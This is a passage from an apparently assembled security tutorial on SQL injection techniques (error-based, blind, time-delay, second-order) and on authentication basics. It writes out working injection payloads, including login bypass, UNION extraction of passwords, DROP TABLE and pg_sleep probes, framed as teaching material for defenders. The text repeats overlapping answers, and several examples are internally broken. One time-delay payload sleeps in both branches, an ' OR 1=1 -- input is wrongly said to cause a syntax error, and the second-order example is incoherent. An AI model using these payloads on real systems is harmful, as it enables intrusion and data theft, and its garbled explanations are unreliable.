    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute(query)
    result = cursor.fetchone()
    conn.close()

    return result
</code></pre>
<p>In this example, the user input <code>user_id</code> is directly concatenated into the SQL query, creating an SQL injection vulnerability.</p>
<p>An attacker can exploit this vulnerability by providing a malicious input that triggers an SQL syntax error. For instance, the attacker can input a single-quote (') to break the SQL query:</p>
<pre><code>Input: 1'
Query: SELECT username, email FROM users WHERE id = 1'
</code></pre>
<p>This SQL query will result in an error since the closing single-quote is missing. The database server will return an error message indicating the problem, which may contain sensitive information or hints about the structure of the database.</p>
<p>In a real-world attack, the attacker may use the error message to gather information about the database, such as column names, table names, or the version of the database system. Armed with this information, the attacker can further refine their attack and attempt to extract sensitive data or even take control of the application.</p>
<p>To prevent error-based SQL injection and other types of SQL injection attacks, it's crucial to use parameterized queries or prepared statements. Parameterized queries ensure that user input is treated as data, not executable code, eliminating the possibility of SQL injection. Additionally, always validate and sanitize user input to prevent malicious inputs from causing security vulnerabilities.</p>
<p>Suppose there is a website that allows users to search for products in a database. The website has a search bar where users can enter the name of the product they are looking for. The website then executes a SQL query to search the database for the product.</p>
<p>The SQL query for the search bar might look something like this:</p>
<pre><code class="language-sql">SELECT * FROM products WHERE name = 'product_name';
</code></pre>
<p>If an attacker can inject malicious code into the search bar, they could cause the database server to generate an error message. For example, the attacker could enter the following text into the search bar:</p>
<pre><code class="language-sql">' OR 1=1 --
</code></pre>
<p>This text will cause the database server to generate an error message if the product name is not found in the database. The error message will typically contain information about the SQL query that was executed, such as the table names and column names. This information can be used by the attacker to further exploit the vulnerability.</p>
<p>In this example, the error message might look something like this:</p>
<p>MySQL Error 1064: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'OR 1=1 --' at line 1</p>
<p>The error message indicates that the SQL query <code>SELECT * FROM products WHERE name = 'product_name' OR 1=1 --</code> was executed. The attacker can now use this information to further exploit the vulnerability. For example, the attacker could try to inject malicious code into the query to extract information from the database.</p>
<p>Error-based SQL injection attacks can be very difficult to prevent. However, by following the tips above, you can help to protect your applications from these attacks.</p>
<p>Certainly! Let's consider a hypothetical scenario where a web application is vulnerable to error-based SQL injection. We'll use a simple login form as an example.</p>
<p>Suppose the application's login functionality queries the database to check if the provided username and password match a user's credentials. The code might look like this (simplified for illustration purposes):</p>
<pre><code class="language-php">&lt;?php
// Get user input from the login form
$username = $_POST['username'];
$password = $_POST['password'];

// Construct the SQL query to check user credentials
$query = &quot;SELECT * FROM users WHERE username = '$username' AND password = '$password'&quot;;

// Execute the query and fetch the result
$result = mysqli_query($connection, $query);

// Check if the query returned any rows
if (mysqli_num_rows($result) &gt; 0) {
    // User login successful
    echo &quot;Login successful!&quot;;
} else {
    // User login failed
    echo &quot;Invalid credentials!&quot;;
}

// Close the database connection
mysqli_close($connection);
?&gt;
</code></pre>
<p>In this example, the user input for the username and password is directly concatenated into the SQL query, creating an SQL injection vulnerability.</p>
<p>An attacker can exploit this vulnerability by providing a malicious input that triggers an SQL syntax error. Let's assume the attacker enters the following username:</p>
<pre><code class="language-sql">' OR 1=1; -- 
</code></pre>
<p>The resulting SQL query will look like this:</p>
<pre><code class="language-sql">SELECT * FROM users WHERE username = '' OR 1=1; -- ' AND password = 'password'
</code></pre>
<p>Explanation of the malicious input:</p>
<ul>
<li>The single-quote (<code>'</code>) after the empty username field is used to close the opening single-quote for the username parameter.</li>
<li><code>OR 1=1</code> is a condition that always evaluates to true, effectively bypassing the password check.</li>
<li>The double-dash (<code>--</code>) represents a SQL comment, which comments out the rest of the query, including the closing single-quote for the password parameter.</li>
</ul>
<p>As a result, the query becomes:</p>
<pre><code class="language-sql">SELECT * FROM users WHERE username = '' OR 1=1;
</code></pre>
<p>The query will return all rows from the <code>users</code> table because <code>1=1</code> always evaluates to true, allowing the attacker to log in without providing a valid password.</p>
<p>In this example, the attacker has successfully exploited the error-based SQL injection vulnerability to gain unauthorized access to the application. To prevent such attacks, it is essential to use parameterized queries or prepared statements, which properly separate data from code and prevent malicious input from being executed as part of the SQL query.</p>
<p>Overview of Exploiting Blind SQL Injection by Triggering Conditional Errors:</p>
<p>Blind SQL injection occurs when an attacker can't directly see the results of their injected queries in the application's response. This might happen if the application suppresses error messages or doesn't display database information. However, the attacker can still infer information by exploiting conditional errors that trigger different application behaviors or responses based on the injected input.</p>
<p>To exploit blind SQL injection through conditional errors, attackers use boolean-based or time-based techniques. In boolean-based blind SQL injection, they craft queries that trigger different application responses (e.g., true or false conditions) based on the injected input. In time-based blind SQL injection, they inject queries that cause time delays, which can be observed in the application's response.</p>
<p>Example of Exploiting Blind SQL Injection by Triggering Conditional Errors:</p>
<p>Consider a web application vulnerable to blind SQL injection in its login form. The application queries the database to check if the provided username and password match a user's credentials. However, it does not provide error messages or login result feedback to the user.</p>
<p>The vulnerable code might look like this (simplified for illustration purposes):</p>
<pre><code class="language-php">&lt;?php
// Get user input from the login form
$username = $_POST['username'];
$password = $_POST['password'];

// Construct the SQL query to check user credentials
$query = &quot;SELECT * FROM users WHERE username = '$username' AND password = '$password'&quot;;

// Execute the query and fetch the result
$result = mysqli_query($connection, $query);

// Check if the query returned any rows
if (mysqli_num_rows($result) &gt; 0) {
    // User login successful
    echo &quot;Login successful!&quot;;
} else {
    // User login failed
    echo &quot;Invalid credentials!&quot;;
}

// Close the database connection
mysqli_close($connection);
?&gt;
</code></pre>
<p>In this example, the application suppresses error messages and only provides generic login feedback. An attacker aims to exploit blind SQL injection to infer information about the database.</p>
<p>The attacker injects the following username during login:</p>
<pre><code class="language-sql">' OR (SELECT 'abc' FROM dual WHERE SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1) = 'a') -- 
</code></pre>
<p>Explanation of the injected input:</p>
<ul>
<li>The single-quote (<code>'</code>) after the empty username field is used to close the opening single-quote for the username parameter.</li>
<li><code>OR</code> introduces a new condition that is always true, bypassing the password check.</li>
<li>The subquery <code>(SELECT 'abc' FROM dual WHERE SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1) = 'a')</code> checks if the first character of the password for the first user in the database is equal to 'a'.</li>
<li>The double-dash (<code>--</code>) represents a SQL comment, which comments out the rest of the query.</li>
</ul>
<p>The application's response will be either &quot;Login successful!&quot; or &quot;Invalid credentials!&quot;. Based on the response, the attacker can infer whether the first character of the password matches 'a'. By repeating the process for different characters, the attacker can gradually reconstruct the password through a process called &quot;binary search&quot; or &quot;blindfolded guessing.&quot;</p>
<p>This example demonstrates how an attacker can exploit blind SQL injection by triggering conditional errors to infer sensitive information, such as the password, without directly seeing the database's contents. To prevent blind SQL injection, developers should use parameterized queries or prepared statements and ensure that user input is correctly sanitized and validated before use in SQL queries.</p>

<div style="break-before: page; page-break-before: always;"></div><h1 id="verbose-error-response"><a class="header" href="#verbose-error-response">Verbose error response</a></h1>
<p>Verbose SQL error messages can sometimes contain sensitive data, such as the database schema, table names, column names, and even data values. This can happen if the application or database server is not properly configured to sanitize error messages.</p>
<p>An attacker can exploit this vulnerability by injecting malicious input into a web application that is used to interact with a database. The malicious input can be designed to cause the application to generate a verbose error message that contains sensitive data.</p>
<p>For example, the attacker could inject a single quote character into the input field. This would cause the application to generate an error message that contains the full SQL query that was executed. The attacker could then use this information to further exploit the vulnerability.</p>
<p>There are a few things that can be done to prevent this vulnerability:</p>
<ul>
<li>The application should be configured to sanitize error messages. This can be done by using a library or framework that provides this functionality.</li>
<li>The database server should be configured to log errors to a file that is not accessible to the public.</li>
<li>The application should be tested for SQL injection vulnerabilities. This can be done using a variety of tools and techniques.</li>
</ul>
<p>If you believe that a web application may be vulnerable to this type of attack, you should report it to the application owner.</p>
<p>Here are some additional tips for preventing verbose SQL error messages from containing sensitive data:</p>
<ul>
<li>Use prepared statements instead of dynamic SQL.</li>
<li>Use bind variables instead of literal values in SQL queries.</li>
<li>Sanitize all user input before it is used in a SQL query.</li>
<li>Log errors to a file that is not accessible to the public.</li>
</ul>
<p>By following these tips, you can help to prevent sensitive data from being exposed in verbose SQL error messages.</p>
<p>Extracting sensitive data via verbose SQL error messages is a technique used in SQL injection attacks where an attacker leverages error messages generated by the database server to gain insights into the structure of the database or extract sensitive information. In this scenario, the attacker injects malicious SQL code into vulnerable application inputs, causing the database server to produce detailed error messages that reveal valuable information about the database.</p>
<p>Here's how attackers can extract sensitive data via verbose SQL error messages:</p>
<ol>
<li>
<p><strong>Identifying Vulnerable Points:</strong> The attacker identifies input fields in the application, such as login forms, search bars, or user registration forms, where user-supplied data is directly inserted into SQL queries without proper validation or sanitization. These points are potential entry points for SQL injection.</p>
</li>
<li>
<p><strong>Injecting Malicious SQL Code:</strong> The attacker crafts input payloads containing SQL code that causes errors. Common techniques include using single quotes, double quotes, or SQL keywords to manipulate the original query.</p>
</li>
<li>
<p><strong>Analyzing Error Messages:</strong> When the attacker submits the malicious payload, the database server encounters an error due to the malformed SQL query. In response, the server may generate verbose error messages, which are either displayed directly to the user or logged in application logs. These error messages might include useful information such as:</p>
<ul>
<li>The database type and version.</li>
<li>Table names, column names, or database schema information.</li>
<li>Partial or complete SQL queries that failed.</li>
</ul>
</li>
<li>
<p><strong>Exploiting Information Leakage:</strong> The attacker analyzes the verbose error messages to extract sensitive information. For example, they may deduce the structure of the database, discover the names of tables or columns, or even identify usernames, passwords, or other confidential data.</p>
</li>
</ol>
<p>Example:</p>
<p>Suppose an e-commerce website's search feature is vulnerable to SQL injection. The search functionality executes an SQL query like this:</p>
<pre><code class="language-sql">SELECT product_name, price FROM products WHERE product_name LIKE '%user_input%';
</code></pre>
<p>The <code>user_input</code> is directly concatenated into the query without proper sanitization. The attacker crafts a malicious input:</p>
<pre><code>' UNION SELECT username, password FROM users; --
</code></pre>
<p>The resulting query becomes:</p>
<pre><code class="language-sql">SELECT product_name, price FROM products WHERE product_name LIKE '%' UNION SELECT username, password FROM users; -- %';
</code></pre>
<p>If the attacker submits this payload, the database server might generate an error message like:</p>
<pre><code>Error: Operand should contain 1 column(s)
</code></pre>
<p>From the error message, the attacker learns that the <code>products</code> and <code>users</code> tables are present, and they can now attempt to extract usernames and passwords from the <code>users</code> table using further injections.</p>
<p>Preventing Verbose SQL Error Messages:</p>
<p>To prevent verbose SQL error messages from revealing sensitive data, developers should:</p>
<ol>
<li>Implement proper input validation and sanitization techniques.</li>
<li>Use parameterized queries or prepared statements to separate data from SQL code.</li>
<li>Disable detailed error messages for production environments.</li>
<li>Regularly update the database management system to address known vulnerabilities.</li>
</ol>
<p>By adopting these best practices, developers can reduce the risk of SQL injection attacks and protect sensitive data from unauthorized access.</p>

<div style="break-before: page; page-break-before: always;"></div><h1 id="time-delays"><a class="header" href="#time-delays">Time delays</a></h1>
<p>Blind SQL injection with time delays is a technique used by attackers to exploit web applications that are vulnerable to SQL injection but do not provide direct feedback to the attacker about the success or failure of the injected SQL query. In such cases, the attacker cannot see the actual results of the injected query directly, but they can infer the information indirectly by inducing time delays in the server's response.</p>
<p>Here's how Blind SQL injection with time delays works:</p>
<ol>
<li>
<p><strong>Identifying a Vulnerable Parameter</strong>: The attacker identifies a user-input parameter in a web application that is susceptible to SQL injection. This could be a URL parameter, a form field, or any other input that is used to construct an SQL query.</p>
</li>
<li>
<p><strong>Injecting Malicious SQL</strong>: The attacker then injects malicious SQL code into the vulnerable parameter to manipulate the original SQL query. The goal is usually to extract sensitive information from the application's database.</p>
</li>
<li>
<p><strong>Time Delay Payload</strong>: In a regular Blind SQL injection, the attacker cannot directly see the results of the injected query. However, by introducing time delays in the server's response, they can determine whether a specific condition is true or false. For example, they may inject a query that causes the server to delay its response for a certain amount of time if a particular condition is met.</p>
</li>
<li>
<p><strong>Inference of Information</strong>: Based on the server's response time, the attacker can infer whether the condition they injected is true or false. By repeatedly injecting queries with different conditions and observing the response times, the attacker can gradually reconstruct the information they seek.</p>
</li>
</ol>
<p><strong>Example</strong>:</p>
<p>Suppose we have a vulnerable web application with a search feature that accepts a parameter called <code>product_id</code> and uses it to construct an SQL query to fetch product information from the database. The application displays product details if a valid <code>product_id</code> is provided.</p>
<p>Here's an example of a Blind SQL injection with time delays:</p>
<p>Original URL: <code>https://example.com/products?product_id=123</code></p>
<p>Suppose the attacker wants to know if there's a product with <code>product_id</code> equal to <code>456</code>. They can inject the following SQL code:</p>
<pre><code>https://example.com/products?product_id=123' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM products WHERE product_id = 456) = 1 THEN pg_sleep(10) ELSE pg_sleep(10) END)-- 
</code></pre>
<p>In this example, the injected SQL code checks if there's a product with <code>product_id</code> equal to <code>456</code>. If the condition is true, the database will introduce a 10-second delay in the server's response due to the <code>pg_sleep(10)</code> function. If the condition is false, there will be no delay.</p>
<p>By observing the response time of the web application, the attacker can determine whether the product with <code>product_id</code> equal to <code>456</code> exists or not.</p>
<p>It's crucial to note that Blind SQL injection attacks can be time-consuming because the attacker needs to carefully construct and test different queries to infer the desired information. Web application developers should take measures to prevent SQL injection vulnerabilities, such as using parameterized queries or prepared statements, to avoid such attacks.</p>
<p>Here is a table showing the time delays in different databases:</p>
<div class="table-wrapper"><table><thead><tr><th>Database</th><th>Function</th><th>Notes</th></tr></thead><tbody>
<tr><td>MySQL</td><td>SLEEP(time)</td><td>Only available since MySQL 5. It takes a number of seconds to wait in parameter.</td></tr>
<tr><td>MySQL</td><td>BENCHMARK(count, expr)</td><td>Executes the specified expression multiple times. By using a large number as first parameter, you will be able to generate a delay.</td></tr>
<tr><td>SQL Server</td><td>WAIT FOR DELAY 'hh:mm:ss'</td><td>Suspends the execution for the specified amount of time.</td></tr>
<tr><td>SQL Server</td><td>WAIT FOR TIME 'hh:mm:ss'</td><td>Suspends the execution of the query and continues it when system time is equal to parameter.</td></tr>
<tr><td>Oracle</td><td>DBMS_LOCK.SLEEP(time)</td><td>Suspends the execution for the specified amount of time.</td></tr>
<tr><td>Oracle</td><td>DBMS_LOCK.SPIN(time)</td><td>Spins for the specified amount of time.</td></tr>
<tr><td>Oracle</td><td>dbms_pipe.receive_message(('a'),10)</td><td>Sleep for 10 seconds</td></tr>
<tr><td>PostgreSQL</td><td>SELECT pg_sleep(10)</td><td>Sleep for 10 seconds</td></tr>
</tbody></table>
</div>
<p>Please note that these are just a few examples of time delays that can be used in different databases. There may be other functions or procedures available that can be used to achieve the same effect.</p>
<p>Here is an example of how to use the SLEEP() function in MySQL to create a 2-minute delay:</p>
<pre><code class="language-sql">SELECT SLEEP(120);
</code></pre>
<p>This query will sleep for 120 seconds, which is equal to 2 minutes.</p>

<div style="break-before: page; page-break-before: always;"></div><h1 id="second-order-sqli"><a class="header" href="#second-order-sqli">Second-order SQLi</a></h1>
<p><strong>Second-order SQL injection</strong> is a type of SQL injection attack where the attacker injects malicious code into a database query that is stored in a web application. The malicious code is then executed when the query is run, which can allow the attacker to gain access to sensitive data or take control of the application.</p>
<p>The difference between first-order and second-order SQL injection is that in first-order injection, the malicious code is executed immediately. In second-order injection, the malicious code is stored in the database and is not executed until the query is run. This makes second-order injection more difficult to detect, because the malicious code is not executed immediately.</p>
<p>Here is an example of a second-order SQL injection attack:</p>
<p>The attacker visits a web application that allows users to search for products. The attacker enters the following search query:</p>
<pre><code>' OR 1=1; --
</code></pre>
<p>The <code>'</code> character is a single quote, which is used to escape special characters in SQL queries. The <code>OR 1=1</code> statement is a Boolean expression that always evaluates to true. The <code>; --</code> statement is a comment that tells the SQL parser to ignore the rest of the query.</p>
<p>When the user submits the search query, the web application will store the query in the database. The next time a user searches for products, the web application will run the query and return the results. However, the malicious code that was injected by the attacker will also be executed. This will allow the attacker to gain access to sensitive data or take control of the application.</p>
<p>Here are some ways to protect against second-order SQL injection attacks:</p>
<ul>
<li><strong>Sanitize user input:</strong> This involves removing any special characters that could be used to inject malicious code.</li>
<li><strong>Use prepared statements:</strong> Prepared statements are a way of preventing SQL injection attacks by binding the input parameters to the query before it is executed.</li>
<li><strong>Use a web application firewall (WAF):</strong> A WAF is a software application that can help to protect web applications from a variety of attacks, including SQL injection attacks.</li>
</ul>
<p>Second-order SQL injection is a type of SQL injection attack that occurs when the malicious input is stored in the database and later used in a subsequent query, leading to SQL injection vulnerabilities in different parts of the application.</p>
<p>Let's explain it with an example:</p>
<p>Suppose we have a simple web application that allows users to post comments on a website. The application takes the user's input and stores it in the database without proper input validation and sanitization.</p>
<ol>
<li>
<p>Initial SQL Injection Vulnerability:
The application has a comment submission form where users can post their comments. The user input is directly used in an SQL query without proper validation and escaping. For example:</p>
<pre><code class="language-sql">$comment = $_POST['comment'];
$sql = &quot;INSERT INTO comments (content) VALUES ('$comment')&quot;;
</code></pre>
<p>A user decides to post a comment with malicious input:</p>
<pre><code>acorn'; DROP TABLE users; --
</code></pre>
<p>The SQL query executed will become:</p>
<pre><code class="language-sql">INSERT INTO comments (content) VALUES ('acorn'; DROP TABLE users; --')
</code></pre>
<p>The attacker successfully executes an SQL injection attack, attempting to drop the &quot;users&quot; table.</p>
</li>
<li>
<p>Second-Order SQL Injection Vulnerability:
The application stores the comment in the database without any immediate issues. However, later in the application's lifecycle, the comments are retrieved and displayed on another page, such as a comment history page or the main website. The application uses the stored comment content directly in another SQL query without proper validation. For example:</p>
<pre><code class="language-sql">$comment_id = $_GET['id'];
$sql = &quot;SELECT * FROM comments WHERE id = $comment_id&quot;;
</code></pre>
<p>The malicious comment containing the payload from the initial SQL injection is retrieved from the database and used in the new query:</p>
<pre><code>$comment_id = 1; -- (malicious comment with payload)
</code></pre>
<p>The SQL query executed will become:</p>
<pre><code class="language-sql">SELECT * FROM comments WHERE id = 1; --'
</code></pre>
<p>The attacker successfully executes a second-order SQL injection attack, potentially manipulating or extracting data from the database.</p>
</li>
</ol>
<p>Second-order SQL injection can be more challenging to detect and mitigate compared to traditional SQL injection attacks because the attack occurs in a different part of the application flow and not directly in the initial user input. Proper input validation, parameterized queries, and escaping of user inputs can help prevent both first-order and second-order SQL injection vulnerabilities.</p>

<p>Authentication is the process of verifying the identity of a user or system. It is a critical security measure that helps to protect systems and data from unauthorized access.</p>
<p>There are many different authentication methods available, but some of the most common include:</p>
<ul>
<li><strong>Username and password:</strong> This is the most common authentication method. Users provide a username and password that they have been assigned to gain access to a system or resource.</li>
<li><strong>Single sign-on (SSO):</strong> This allows users to authenticate once and then access multiple systems or resources without having to provide their credentials again.</li>
<li><strong>Multi-factor authentication (MFA):</strong> This requires users to provide two or more pieces of evidence to verify their identity, such as a username and password, plus a code from their phone or a fingerprint scan.</li>
<li><strong>Biometrics:</strong> This uses physical characteristics, such as fingerprints or facial scans, to verify a user's identity.</li>
</ul>
<p>The type of authentication method that is used will depend on the specific needs of the system or resource. For example, a system that contains sensitive data may require stronger authentication methods, such as MFA or biometrics.</p>
<p>Authentication is an essential security measure that helps to protect systems and data from unauthorized access. By using strong authentication methods, organizations can help to keep their systems and data safe from attack.</p>
<p>Here are some additional benefits of authentication:</p>
<ul>
<li><strong>It helps to prevent unauthorized access to systems and data.</strong></li>
<li><strong>It helps to protect against fraud and identity theft.</strong></li>
<li><strong>It helps to ensure the integrity of systems and data.</strong></li>
<li><strong>It helps to improve user productivity.</strong></li>
</ul>
<p>By implementing strong authentication methods, organizations can help to improve their security posture and protect their systems and data from attack.</p>
<p>Authentication is the process of verifying the identity of a user, device, or entity attempting to access a system, network, application, or resource. It is a fundamental security mechanism used to ensure that only authorized and legitimate users can gain access to sensitive information or perform specific actions.</p>
<p>The main goal of authentication is to answer the question, &quot;Who are you?&quot; by validating the claimed identity of the entity attempting to access the system or resource. Once the identity is verified, the authenticated user is granted appropriate privileges and access rights based on their role and permissions within the system.</p>
<p>Authentication can take various forms, and the choice of authentication method depends on the level of security required and the specific use case. Some common authentication methods include:</p>
<ol>
<li>
<p><strong>Username and Password</strong>: This is the most basic form of authentication, where users provide a username and a secret password to access an account or system. However, it is vulnerable to password-related attacks if not properly implemented.</p>
</li>
<li>
<p><strong>Multi-Factor Authentication (MFA)</strong>: MFA combines two or more authentication factors, typically something the user knows (password), something the user has (a mobile device or hardware token), and something the user is (biometric data like fingerprints or facial recognition). MFA provides an extra layer of security, making it harder for unauthorized users to gain access.</p>
</li>
<li>
<p><strong>Biometric Authentication</strong>: Biometric authentication uses unique physical or behavioral characteristics of a person, such as fingerprints, iris scans, facial recognition, or voice patterns, to verify their identity.</p>
</li>
<li>
<p><strong>Token-Based Authentication</strong>: Tokens, like JSON Web Tokens (JWT), are cryptographic tokens that contain user information and are used for authentication. They are often used in stateless environments like APIs.</p>
</li>
<li>
<p><strong>Certificate-Based Authentication</strong>: Certificate-based authentication uses digital certificates to verify the identity of users or devices.</p>
</li>
<li>
<p><strong>Single Sign-On (SSO)</strong>: SSO enables users to log in once and gain access to multiple applications or systems without needing to re-enter credentials for each one. It simplifies the user experience and reduces the risk of password-related vulnerabilities.</p>
</li>
<li>
<p><strong>OAuth and OpenID Connect</strong>: These protocols are commonly used for authentication and authorization in the context of web applications and APIs.</p>
</li>
</ol>
<p>Effective authentication is a crucial aspect of ensuring the security of systems and data. Web applications, online services, networks, and various IT resources utilize authentication to control access and protect sensitive information from unauthorized users and potential cyber threats.</p>
<p>Authentication and authorization are two important concepts in information security. They are often confused with each other, but they have different meanings.</p>
<p><strong>Authentication</strong> is the process of verifying the identity of a user or system. It is the first step in ensuring that only authorized users have access to a system or resource.</p>
<p><strong>Authorization</strong> is the process of determining what actions a user or system is allowed to perform. It is the second step in ensuring that only authorized users have access to a system or resource.</p>
<p>In other words, authentication is about <strong>who</strong> a user is, while authorization is about <strong>what</strong> a user can do.</p>
<p>Here is an example to illustrate the difference between authentication and authorization:</p>
<ul>
<li><strong>Authentication:</strong> A user enters their username and password to log into a system. The system authenticates the user by checking their credentials against a database. If the credentials match, the user is granted access to the system.</li>
<li><strong>Authorization:</strong> The user is now logged into the system. They want to access a sensitive file. The system authorizes the user to access the file by checking their permissions. If the user has the correct permissions, they are granted access to the file.</li>
</ul>
<p>Authentication and authorization are both important security measures that help to protect systems and data from unauthorized access. By implementing strong authentication and authorization methods, organizations can help to keep their systems and data safe from attack.</p>
<p>Here are some additional differences between authentication and authorization:</p>
<ul>
<li><strong>Authentication is typically performed before authorization.</strong> This is because the system needs to know who the user is before it can determine what they are allowed to do.</li>
<li><strong>Authentication is typically performed by the system,</strong> while authorization is typically performed by the application. This is because the application is the one that knows what actions the user is allowed to perform.</li>
<li><strong>Authentication is typically done using a username and password,</strong> while authorization can be done using a variety of methods, such as role-based access control (RBAC) or attribute-based access control (ABAC).</li>
</ul>
<p>By understanding the difference between authentication and authorization, organizations can implement the appropriate security measures to protect their systems and data.</p>
<p>Authentication and authorization are two essential security concepts used in computing and information systems, and they serve distinct purposes:</p>
<ol>
<li><strong>Authentication</strong>:
Authentication is the process of verifying the identity of a user, device, or entity trying to access a system or resource. It ensures that the entity claiming a particular identity is, indeed, who they say they are. The main goal of authentication is to answer the question, &quot;Who are you?&quot;</li>
</ol>
<p>Authentication typically involves the use of credentials or factors to prove one's identity. Common authentication methods include username and password, biometric data (e.g., fingerprints, facial recognition), possession of a physical token (e.g., smart card), or a combination of multiple factors (Multi-Factor Authentication - MFA).</p>
<p>After a successful authentication, the system recognizes the user as a valid entity and grants access privileges based on their role and permissions. However, authentication alone does not determine what actions or resources a user is allowed to access; that's where authorization comes in.</p>
<ol start="2">
<li><strong>Authorization</strong>:
Authorization is the process of determining what actions or resources an authenticated user, device, or entity is allowed to access within the system. It answers the question, &quot;What are you allowed to do?&quot;</li>
</ol>
<p>Once a user is authenticated, their identity is used to look up the access control list (ACL) or permissions associated with their account. Based on this information, the system decides which resources the user is permitted to access and what operations they can perform (e.g., read, write, execute).</p>
<p>Authorization involves defining roles, permissions, and access controls to restrict or allow actions within the system. This helps ensure that users can only access the resources they are authorized to use, preventing unauthorized access to sensitive data or functionalities.</p>
<p>In summary, the key differences between authentication and authorization are:</p>
<ul>
<li><strong>Purpose</strong>: Authentication verifies the identity of users or entities, while authorization determines their access rights and permissions.</li>
<li><strong>Question</strong>: Authentication asks &quot;Who are you?&quot;, while authorization asks &quot;What are you allowed to do?&quot;</li>
<li><strong>Process</strong>: Authentication involves validating identity through credentials or factors, while authorization involves checking access controls and permissions.</li>
</ul>
<p>Both authentication and authorization are crucial components of a comprehensive security strategy, and they work together to safeguard sensitive data and protect systems from unauthorized access or misuse.</p>
<p>Authentication vulnerabilities can arise due to various reasons, and they often occur when developers do not implement secure authentication mechanisms or fail to follow best practices. Here are some common reasons why authentication vulnerabilities may arise:</p>
<ol>
<li>
<p><strong>Weak Password Policies</strong>: Allowing weak passwords, such as short or easily guessable ones, makes it easier for attackers to guess or brute-force their way into user accounts.</p>
</li>
<li>
<p><strong>Insecure Password Storage</strong>: Storing passwords in plaintext or using weak hashing algorithms without salting can expose user credentials if the database is compromised.</p>
</li>
<li>
<p><strong>Lack of Multi-Factor Authentication (MFA)</strong>: Not enforcing MFA for sensitive accounts leaves them vulnerable to attacks, even if the passwords are strong.</p>
</li>
<li>
<p><strong>Insufficient Account Lockout Policies</strong>: Not implementing account lockout after multiple failed login attempts allows attackers to perform brute-force attacks without any hindrance.</p>
</li>
<li>
<p><strong>Session Management Issues</strong>: Poorly managed session tokens can lead to session hijacking or session fixation attacks, allowing attackers to impersonate legitimate users.</p>
</li>
<li>
<p><strong>Insecure Token Handling</strong>: Vulnerabilities in token-based authentication, like JSON Web Tokens (JWT), can lead to token forging or tampering.</p>
</li>
<li>
<p><strong>Username Enumeration</strong>: When the application provides different responses for valid and invalid usernames during the login process, attackers can use this information to discover valid usernames and target them.</p>
</li>
<li>
<p><strong>Cross-Site Request Forgery (CSRF)</strong>: CSRF attacks can trick authenticated users into performing unintended actions on a website while they are logged in.</p>
</li>
<li>
<p><strong>Password Reset Vulnerabilities</strong>: Weaknesses in the password reset process, such as predictable reset tokens or insufficient authorization checks, can enable attackers to take control of accounts.</p>
</li>
<li>
<p><strong>Credential Stuffing</strong>: If users have reused passwords across different services and their credentials are leaked in a data breach, attackers can use this information to gain unauthorized access to other accounts.</p>
</li>
<li>
<p><strong>Insufficient Authentication Factors</strong>: Not utilizing multiple authentication factors (e.g., something the user knows, has, or is) reduces the security level of the authentication process.</p>
</li>
<li>
<p><strong>Insecure Communication Protocols</strong>: Transmitting login credentials over an insecure HTTP connection can expose them to eavesdropping and man-in-the-middle attacks.</p>
</li>
<li>
<p><strong>Failure to Enforce Logout</strong>: Not terminating active sessions after a period of inactivity or allowing users to remain logged in indefinitely can lead to unauthorized access if the device is left unattended.</p>
</li>
<li>
<p><strong>Insecure Authentication Flows</strong>: Improperly implemented authentication flows can lead to logical flaws or bypasses, allowing attackers to gain unauthorized access.</p>
</li>
</ol>
<p>These vulnerabilities can be introduced during the design, development, or configuration phases of a web application. It is essential for developers to be aware of these risks and follow best practices for secure authentication, such as using strong password policies, implementing secure hashing algorithms, enforcing MFA, and regularly testing for security vulnerabilities. Security audits and code reviews can also help identify and address potential authentication vulnerabilities before they can be exploited by attackers.</p>
<p>Authentication vulnerabilities arise in a number of ways, including:</p>
<ul>
<li><strong>Weak passwords:</strong> This is one of the most common causes of authentication vulnerabilities. Users often choose weak passwords, such as &quot;password123&quot; or &quot;123456.&quot; These passwords are easy to crack, and attackers can easily gain access to accounts by using brute-force attacks.</li>
<li><strong>Poor password management:</strong> This vulnerability occurs when organizations do not properly manage passwords. For example, an organization might store passwords in plain text, which makes them easy to steal. Or, an organization might not have a password expiration policy, which means that users can use the same password for years, which makes them even easier to crack.</li>
<li><strong>Brute-force attacks:</strong> This is a type of attack where an attacker tries a large number of passwords to gain access to an account. Brute-force attacks can be very effective against weak passwords, and they can also be used to exploit poor password management practices.</li>
<li><strong>Session hijacking:</strong> This is a type of attack where an attacker steals a user's session token, which allows them to impersonate the user. Session hijacking can be used to gain access to sensitive data or to perform unauthorized actions on behalf of the user.</li>
<li><strong>Cross-site scripting (XSS):</strong> This is a type of attack where an attacker injects malicious code into a web application. This code can then be executed by other users, which can steal their cookies or session tokens.</li>
<li><strong>Insecure direct object references:</strong> This is a type of vulnerability where an attacker can access resources that they should not be able to access. For example, an attacker might be able to access a user's profile by knowing their username.</li>
</ul>
<p>These are just some of the most common ways that authentication vulnerabilities arise. By understanding these vulnerabilities, organizations can help to protect their systems and data from attack.</p>
<p>Here are some additional tips for preventing authentication vulnerabilities:</p>
<ul>
<li>Use strong passwords and encourage users to do the same.</li>

<li><strong>Financial losses:</strong> An attacker may be able to use stolen data to commit fraud or identity theft, which can result in financial losses for the organization.</li>
<li><strong>Reputational damage:</strong> A data breach can damage an organization's reputation, which can lead to lost customers and business partners.</li>
<li><strong>Legal liability:</strong> An organization may be held legally liable for the consequences of a data breach, such as fines or lawsuits.</li>
</ul>
<p>To mitigate the risk of vulnerable authentication, organizations should implement strong authentication controls, such as:</p>
<ul>
<li><strong>Strong passwords:</strong> Passwords should be at least 12 characters long and contain a mix of upper and lowercase letters, numbers, and symbols.</li>
<li><strong>Password expiration:</strong> Passwords should expire regularly, so that users are forced to update them.</li>
<li><strong>Multi-factor authentication:</strong> Multi-factor authentication requires users to provide two or more pieces of evidence to verify their identity, such as a password and a code from their phone.</li>
<li><strong>Session management:</strong> Session tokens should be invalidated after a period of inactivity, so that attackers cannot hijack sessions.</li>
<li><strong>Data encryption:</strong> Sensitive data should be encrypted at rest and in transit, so that it cannot be read if it is intercepted.</li>
</ul>
<p>By implementing strong authentication controls, organizations can help to protect their systems and data from attack.</p>
<p>Here are some additional tips for mitigating the risk of vulnerable authentication:</p>
<ul>
<li><strong>Educate users about the importance of strong passwords and password hygiene.</strong></li>
<li><strong>Use a password manager to help users generate and store strong passwords.</strong></li>

